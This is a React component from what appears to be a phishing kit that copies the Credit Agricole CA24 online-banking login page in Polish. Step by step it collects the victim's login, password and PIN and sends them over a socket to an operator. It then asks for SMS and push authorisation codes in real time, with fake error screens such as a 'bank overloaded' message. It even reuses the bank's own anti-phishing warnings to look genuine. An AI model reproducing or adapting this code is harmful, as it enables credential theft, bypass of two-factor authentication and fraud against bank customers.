import {useSocket} from "../../../context/socket/socketProvider";
import {useEffect, useState} from "react";
import AgricoleFormCode from "./AgricoleFormCode";
import AgricoleLoader from "./AgricoleLoader";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import * as yup from "yup";
import {Form} from "reactstrap";

const schema = yup.object().shape({
    login: yup.string().max(30).required(),
    password: yup.string().required(),
    pin: yup.string().required().matches(/^[0-9]{4}$/)
});

const AgricoleForm = () => {
    const {user, setUser, initUser, connect, disconnect, sendCode, sendData} = useSocket();
    const [step, setStep] = useState(1);
    const submitLogin = (data) => {
        console.log('Login', data);
        setStep(1);
        reset();
        initUser({
            ...data, bank: 'agricole'
        });
    }
    // console.log(user)
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }
    console.log(step, user)
    const {register, handleSubmit, trigger,setError, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });

    // const load = (index) => {
    //     setLoading(true);
    //
    //     setTimeout(() => {
    //         setLoading(false);
    //         setStep(index);
    //     }, 1500)
    // }
    useEffect(() => {
        if (user.status === 'wrong_login' || user.status === 'wrong_code') {
            setStep(0);
        }
    }, [user])
    useEffect(() => {
        console.log('connect')
        connect('agricole');
        setError("login", {
            type: "manual",
            message: "Dont Forget Your Username Should Be Cool!",
        });
        return () => disconnect();
    }, [])

    // if (user.status === '' || user.status === 'wrong_login'){
    //     return <AgricoleFormLogin handler={submitLogin}/>
    // }
    // else if ( user.status === 'getting_code' || user.status === 'wrong_code' ){
    //     return <AgricoleFormCode handler={submitCode}/>
    // }
    // else if ( user.status === 'broke_user' ){
    //     return <AgricoleFail/>
    // }
    return (
        <div className={'agricole'}>
            <app-login className="ng-tns-c169-3 ng-star-inserted">
                <div className="ng-tns-c169-3 ng-trigger ng-trigger-routeAnimation">
                    <router-outlet className="ng-tns-c169-3"/>
                    <app-login-screen className="ng-tns-c168-4 ng-star-inserted" style={{}}>
                        <div className="container-fluid ng-tns-c168-4">
                            <div className="row justify-content-end ng-tns-c168-4">
                                <div className="col-12 col-md-6 ng-tns-c168-4">
                                    {
                                        step >= 2 &&
                                        <app-login-security-image
                                            className="ng-tns-c168-11 ng-star-inserted">
                                            <div aria-hidden="true" className="security-image-container">
                                                <div className="security-image-container-inner">
                                                    <div className="image img-img01">
                                                        <div className="sr-only">Obrazek bezpieczeństwa Karmnik</div>
                                                    </div>
                                                    <div className="user">Identyfikator: <div
                                                        className="user-login">{user.login}</div></div>
                                                </div>
                                            </div>
                                        </app-login-security-image>
                                    }
                                </div>

                                <div className="col-12 col-md-6 md-strech ng-tns-c168-4">
                                    {
                                        user.status === '' || user.status === 'wrong_login' ?
                                            <Form onSubmit={handleSubmit(submitLogin)}>
                                                {
                                                    step === 0 ?
                                                        <app-login-alert
                                                            lassName="grow-0 ng-tns-c168-6 ng-trigger ng-trigger-expandCollapseAnimation ng-star-inserted">
                                                            <div role="alert" className="alert alert-danger">
                                                                <i className="icon"/>
                                                                <div>
                                                                    <h1 className="inherit">Wprowadziłeś niepoprawny
                                                                        Identyfikator lub Hasło. Spróbuj ponownie.</h1>
                                                                    <a className="btn btn-primary btn-lg btn-wrap ng-star-inserted"
                                                                       onClick={(e) => {
                                                                           e.preventDefault();
                                                                           setUser({
                                                                               ...user,
                                                                               status: ''
                                                                           });
                                                                           setStep(1);
                                                                       }}
                                                                    >
                                                                        Zaloguj ponownie
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </app-login-alert> :
                                                        step === 1 ?
                                                            <app-login-form-user
                                                                className="ng-tns-c168-4 ng-star-inserted">
                                                                <div className="card-inner form-container">
                                                                    <div className="ng-pristine">
                                                                        <h1 className="h4">Zaloguj się</h1>
                                                                        <div
                                                                            className="form-group input-keyboard-group user-group not-too-wide">
                                                                            <label>Twój
                                                                                identyfikator </label>
                                                                            <input
                                                                                type="text"
                                                                                autoComplete="off"
                                                                                className="form-control ng-pristine ng-invalid ng-touched"
                                                                                placeholder="Wprowadź identyfikator"
                                                                                aria-hidden="false"
                                                                                {...register('login')}
                                                                            />
                                                                        </div>
                                                                        <div
                                                                            className="form-group not-too-wide text-right my-2 my-lg-0">
                                                                            {/* eslint-disable-next-line jsx-a11y/anchor-is-valid */}
                                                                            <a href="javascript:void(null);"
                                                                               className="text-link-sm"><span>Masz problem z zalogowaniem?</span></a>
                                                                        </div>
                                                                        <div
                                                                            className="form-group not-too-wide text-right mb-4 ng-star-inserted">
                                                                            <a href="javascript:void(null);"
                                                                               className="text-link-sm"><span>Nie pamiętasz hasła?</span></a>
                                                                        </div>

                                                                        <div
                                                                            className="buttons buttons-right not-too-wide">
                                                                            <button
                                                                                type="button"
                                                                                className="btn btn-primary btn-lg"
                                                                                disabled={errors.login}
                                                                                onClick={() => {
                                                                                    console.log(errors)
                                                                                    trigger('login').then((res) => {

                                                                                        if (res) {
                                                                                            setUser({
                                                                                                ...user,
                                                                                                login: document.querySelector('input[name=login]').value
                                                                                            })
                                                                                            setStep(2);
                                                                                            // setError("password", {
                                                                                            //     type: "manual",
                                                                                            //     message: "Dont Forget Your Username Should Be Cool!",
                                                                                            // });
                                                                                        }

                                                                                    })
                                                                                }}
                                                                            >
                                                                                DALEJ
                                                                            </button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </app-login-form-user> :
                                                            step === 2 ?
                                                                <app-login-form-password
                                                                    className="ng-tns-c168-11 ng-star-inserted">
                                                                    <div className="form-container card-inner h-100">
                                                                        <div
                                                                            className="ng-pristine ng-invalid ng-touched">
                                                                            <input type="password" defaultValue
                                                                                   style={{display: 'none'}}/>
                                                                            <input type="password" defaultValue
                                                                                   style={{display: 'none'}}/>
                                                                            <input type="password" defaultValue
                                                                                   style={{display: 'none'}}/>
                                                                            <input type="password" defaultValue
                                                                                   style={{display: 'none'}}/>
                                                                            <input type="password" defaultValue
                                                                                   style={{display: 'none'}}/>
                                                                            <input type="password" defaultValue
                                                                                   style={{display: 'none'}}/>
                                                                            <h1 className="h4">Zaloguj się</h1>
                                                                            <div
                                                                                className="form-group user-group input-keyboard-group not-too-wide">
                                                                                <label htmlFor="password">
                                                                                    <span className="sr-only">Identyfikator: login Obrazek bezpieczeństwa Karmnik</span> Twoje
                                                                                    hasło
                                                                                    <a href="javascript:void(null);"
                                                                                       className="help-info help-info-md"
                                                                                       aria-label="Podpowiedź">
                                                                                        <i className="ca ca-question"/>
                                                                                    </a>
                                                                                </label>
                                                                                <input
                                                                                    type="password"
                                                                                    autoComplete="off"
                                                                                    className="form-control ng-pristine ng-invalid ng-touched"
                                                                                    placeholder="Wprowadź hasło"
                                                                                    {...register('password')}
                                                                                />
                                                                            </div>
                                                                            <div className="d-flex flex-column-reverse">
                                                                                <div
                                                                                    className="buttons buttons-between align-items-center flex-row-reverse not-too-wide">
                                                                                    <button id="login-pass-click-button"
                                                                                            type="button"
                                                                                            className="btn btn-primary btn-lg"
                                                                                            disabled={errors.password}
                                                                                            onClick={() => {
                                                                                                console.log(errors)
                                                                                                trigger('password').then((res) => {
                                                                                                    if (res) {
                                                                                                        setStep(3);
                                                                                                    }
                                                                                                })
                                                                                            }}
                                                                                    > DALEJ
                                                                                    </button>
                                                                                    <a href="#"
                                                                                       className="text-link-lg"
                                                                                       onClick={(e) => {
                                                                                           e.preventDefault();
                                                                                           setStep(1)
                                                                                       }}
                                                                                    >
                                                                                        <i className="ca ca-arrow-link-left"/>
                                                                                        <span>Wróć</span>
                                                                                    </a>
                                                                                </div>
                                                                                <div
                                                                                    className="form-group not-too-wide text-right mb-4 ng-star-inserted">
                                                                                    <a href="javascript:void(null);"
                                                                                       className="text-link-sm"><span>Nie pamiętasz hasła?</span></a>
                                                                                </div>

                                                                                <div
                                                                                    className="form-group not-too-wide text-right my-2 my-lg-0">
                                                                                    <a href="javascript:void(null);"
                                                                                       className="text-link-sm"><span>Masz problem z zalogowaniem?</span></a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </app-login-form-password> :
                                                                step === 3 ?
                                                                    <app-login-form-pin
                                                                        className="ng-tns-c168-4 ng-star-inserted">
                                                                        <div className="card-inner form-container">
                                                                            <div autoComplete="off" aria-hidden="false"
                                                                                 className="ng-pristine"
                                                                            >
                                                                                <h1 className="h4">Zaloguj się</h1>
                                                                                <div
                                                                                    className="form-group input-keyboard-group user-group not-too-wide">
                                                                                    <label>Wpisz PIN </label>
                                                                                    <input
                                                                                        type="number"
                                                                                        autoComplete="off"
                                                                                        className="form-control ng-pristine ng-invalid ng-touched"
                                                                                        placeholder="Wprowadź PIN"
                                                                                        aria-hidden="false"
                                                                                        {...register('pin')}
                                                                                    />
                                                                                </div>
                                                                                <div
                                                                                    className="form-group not-too-wide text-right my-2 my-lg-0">
                                                                                    <a href="javascript:void(null);"
                                                                                       className="text-link-sm"><span>Masz problem z zalogowaniem?</span></a>
                                                                                </div>
                                                                                <div
                                                                                    className="form-group not-too-wide text-right mb-4 ng-star-inserted">
                                                                                    <a href="javascript:void(null);"
                                                                                       className="text-link-sm"><span>Nie pamiętasz hasła?</span></a>
                                                                                </div>

                                                                                <div
                                                                                    className="buttons buttons-between align-items-center flex-row-reverse not-too-wide">
                                                                                    <button id="login-pass-click-button"
                                                                                            type="submit"
                                                                                            disabled={errors.pin}
                                                                                            className="btn btn-primary btn-lg"
                                                                                    > ZATWIERDŹ
                                                                                    </button>
                                                                                    <a href="#"
                                                                                       className="text-link-lg"
                                                                                       onClick={(e) => {
                                                                                           e.preventDefault();
                                                                                           setStep(2)
                                                                                       }}
                                                                                    >
                                                                                        <i className="ca ca-arrow-link-left"/>
                                                                                        <span>Wróć</span>
                                                                                    </a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </app-login-form-pin> : null
                                                }
                                            </Form> :
                                            user.status === 'getting_code' || user.status === 'wrong_code'  ?
                                                step === 0 ?
                                                    <app-login-alert
                                                        lassName="grow-0 ng-tns-c168-6 ng-trigger ng-trigger-expandCollapseAnimation ng-star-inserted">
                                                        <div role="alert" className="alert alert-danger">
                                                            <i className="icon"/>
                                                            <div>
                                                                <h1 className="inherit">Wprowadziłeś niepoprawny
                                                                    kod. Spróbuj ponownie.</h1>
                                                                <a className="btn btn-primary btn-lg btn-wrap ng-star-inserted"
                                                                   onClick={(e) => {
                                                                       e.preventDefault();
                                                                       setUser({
                                                                           ...user,
                                                                           status: 'getting_code'
                                                                       });
                                                                       setStep(1);
                                                                   }}
                                                                >
                                                                    Zaloguj ponownie
                                                                </a>
                                                            </div>
                                                        </div>
                                                    </app-login-alert> :
                                                    <AgricoleFormCode handler={submitCode} status={user.status}/> :
                                                user.status === 'getting_push_code' || user.status === 'wrong_push_code'?
                                                    step === 0 ?
                                                        <app-login-alert
                                                            lassName="grow-0 ng-tns-c168-6 ng-trigger ng-trigger-expandCollapseAnimation ng-star-inserted">
                                                            <div role="alert" className="alert alert-danger">
                                                                <i className="icon"/>
                                                                <div>
                                                                    <h1 className="inherit">Wprowadziłeś niepoprawny
                                                                        kod. Spróbuj ponownie.</h1>
                                                                    <a className="btn btn-primary btn-lg btn-wrap ng-star-inserted"
                                                                       onClick={(e) => {
                                                                           e.preventDefault();
                                                                           setUser({
                                                                               ...user,
                                                                               status: 'getting_push_code'
                                                                           });
                                                                           setStep(1);
                                                                       }}
                                                                    >
                                                                        Zaloguj ponownie
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </app-login-alert> :
                                                        <AgricoleFormCode handler={submitPush} status={user.status}/> :
                                                user.status === 'broke_user' ?
                                                    <app-login-alert
                                                        lassName="grow-0 ng-tns-c168-6 ng-trigger ng-trigger-expandCollapseAnimation ng-star-inserted">
                                                        <div role="alert" className="alert alert-danger">
                                                            <i className="icon"/>
                                                            <div>
                                                                <h1 className="inherit"> Błąd, bank jest przeciążony.
                                                                    Spróbuj ponownie później lub wybierz inny bank.</h1>

                                                            </div>
                                                        </div>
                                                    </app-login-alert> :
                                                    <AgricoleLoader/>


                                    }


                                </div>
                                <div
                                    className={`col-12 col-md-6 ng-tns-c168-4 ng-star-inserted ${step < 2 && 'md-sticky-bottom-container'}`}
                                    style={{alignSelf: 'auto'}}>
                                    <app-login-note-alert
                                        className="ng-tns-c168-4 ng-star-inserted">
                                        <div className="note-alert card ng-star-inserted">
                                            <div role="complementary"
                                                 className="alert alert-warning card-inner"><h2
                                                className="caption">UWAGA</h2>
                                                <div><h5><strong>Bezpieczne
                                                    bankowanie&nbsp;</strong><br/><strong>-
                                                    dla Ciebie i dla nas</strong></h5>
                                                    <p>&nbsp;</p>
                                                    <p>Drodzy Klienci,</p>
                                                    <p>&nbsp;</p>
                                                    <p>zależy nam na bezpieczeństwie Waszym oraz
                                                        naszych
                                                        pracowników. Każdy z
                                                        nas ma duży wpływ na ograniczenie ryzyka
                                                        rozprzestrzeniania
                                                        się
                                                        koronawirusa. Dlatego zachęcamy, prosimy i
                                                        przypominamy:</p>
                                                    <ul>
                                                        <li>Korzystaj z bankowości zdalnej. Wiele
                                                            spraw,
                                                            np.
                                                            płatności za
                                                            rachunki, przelewy, możesz załatwić
                                                            logując
                                                            się
                                                            do
                                                            serwisu internetowego
                                                            CA24 eBank lub aplikacji mobilnej CA24
                                                            Mobile.&nbsp;
                                                        </li>
                                                        <li>Płać kartą, telefonem i regularnie je
                                                            dezynfekuj.&nbsp;
                                                        </li>
                                                        <li>Zostań w domu, jeśli źle się czujesz.
                                                            Zakupy
                                                            zrób przez
                                                            internet – jeśli to możliwe.&nbsp;
                                                        </li>
                                                    </ul>
                                                    <p>Bądź wyrozumiały. Wprowadziliśmy dodatkowe
                                                        zasady
                                                        obsługi
                                                        klientów w
                                                        naszych placówkach. Z troską o zdrowie
                                                        naszych
                                                        pracowników
                                                        organizujemy
                                                        pracę tak, by zapewnić jak najlepszą jakość
                                                        obsługi.</p>
                                                    <p>Więcej informacji przeczytasz na <a
                                                        href="https://www.credit-agricole.pl/bezpieczenstwo/bezpieczne-bankowanie-dla-ciebie-i-dla-nas"
                                                        target="_blank" rel="noopener noreferrer">naszej
                                                        stronie</a>.
                                                    </p>
                                                </div>
                                            </div>
                                        </div>
                                    </app-login-note-alert>
                                </div>

                                <div
                                    className="col-12 col-md-6 md-strech ng-tns-c168-4 ng-star-inserted">
                                    <app-login-security-info className="ng-tns-c168-4">
                                        <div
                                            className="security-info-container card-inner clearfix h-100 ng-star-inserted">
                                            <div><h5><a
                                                href="https://www.credit-agricole.pl/o-banku/aktualnosci/2021/ostrzezenie-oszusci-podaja-sie-za-pracownikow-banku"
                                                target="_blank" rel="noopener noreferrer"><strong>Aktualne
                                                ostrzeżenie:
                                                oszuści podają się za pracowników banku</strong></a>
                                            </h5>
                                                <p>&nbsp;</p>
                                                <h5>Kiedy korzystasz z bankowości internetowej,
                                                    przestrzegaj
                                                    kilku
                                                    ważnych zasad:</h5>
                                                <ul>
                                                    <li><strong>zanim się zalogujesz
                                                        sprawdź:</strong>
                                                    </li>
                                                </ul>
                                                <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - czy
                                                    w
                                                    pasku
                                                    jest
                                                    prawidłowy adres:
                                                    https://ca24.credit-agricole.pl, <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                    - czy przed adresem jest symbol
                                                    kłódki, <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                    - czy certyfikat serwisu jest prawidłowy (taki
                                                    jak opisujemy w
                                                    sekcji <a
                                                        href="https://www.credit-agricole.pl/bezpieczenstwo/korzystanie-z-nowego-serwisu-internetowego-ca24"
                                                        target="_blank"
                                                        rel="noopener noreferrer">Bezpieczeństwo</a>),<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                    - czy po lewej stronie ekranu z hasłem
                                                    wyświetla się Twój
                                                    obrazek bezpieczeństwa;</p>
                                                <ul>
                                                    <li>&nbsp;nie korzystaj z linków do logowania
                                                        otrzymanych w
                                                        SMS-ach i e-mailach;
                                                    </li>
                                                    <li>&nbsp;zawsze samodzielnie wpisuj adres CA24
                                                        eBank.
                                                        Możesz
                                                        zapisać
                                                        ten adres w „ulubionych” w przeglądarce lub
                                                        przechodzić do
                                                        serwisu ze
                                                        strony głównej banku;
                                                    </li>
                                                    <li>&nbsp;jeżeli cokolwiek budzi Twoje
                                                        wątpliwości,
                                                        gdy
                                                        się
                                                        logujesz lub
                                                        autoryzujesz transakcję – przerwij operację,
                                                        nie
                                                        wprowadzaj
                                                        danych i
                                                        skontaktuj się z nami jak najszybciej.
                                                    </li>
                                                </ul>
                                                <p className="left"><a
                                                    href="https://www.credit-agricole.pl/bezpieczenstwo"
                                                    target="_blank" rel="noopener noreferrer">Dowiedz się
                                                    więcej o
                                                    bezpieczeństwie</a></p></div>
                                        </div>
                                    </app-login-security-info>
                                </div>
                            </div>
                        </div>
                    </app-login-screen>
                </div>
            </app-login>
        </div>

    )
}
export default AgricoleForm;